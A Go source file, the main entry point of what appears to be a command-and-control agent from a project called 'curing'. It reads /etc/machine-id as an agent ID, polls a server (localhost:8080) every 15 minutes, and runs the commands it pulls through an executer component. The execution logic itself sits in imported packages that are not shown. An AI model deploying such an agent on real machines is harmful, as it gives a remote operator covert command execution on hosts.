//go:build linux

package main

import (
	"context"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/amitschendel/curing/pkg/config"
	"github.com/amitschendel/curing/pkg/executer"
)

func main() {
	ctx := context.Background()

	// Get the agent ID from the machine-id file
	agentID, err := os.ReadFile("/etc/machine-id")
	if err != nil {
		log.Fatal(err)
	}

	cfg := &config.Config{
		ConnectIntervalSec: 15 * 60,
		Server: config.ServerDetails{
			Host: "localhost",
			Port: 8080,
		},
		AgentID: string(agentID),
	}

	// Create the executer
	commandExecuter, err := executer.NewExecuter(ctx)
	if err != nil {
		log.Fatal(err)
	}

	// Create the command puller
	puller, err := executer.NewCommandPuller(cfg, ctx, commandExecuter)
	if err != nil {
		log.Fatal(err)
	}

	// Start both components
	go commandExecuter.Run()
	go puller.Run()

	// Wait for shutdown signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	// Cleanup
	puller.Close()
	commandExecuter.Close()
}
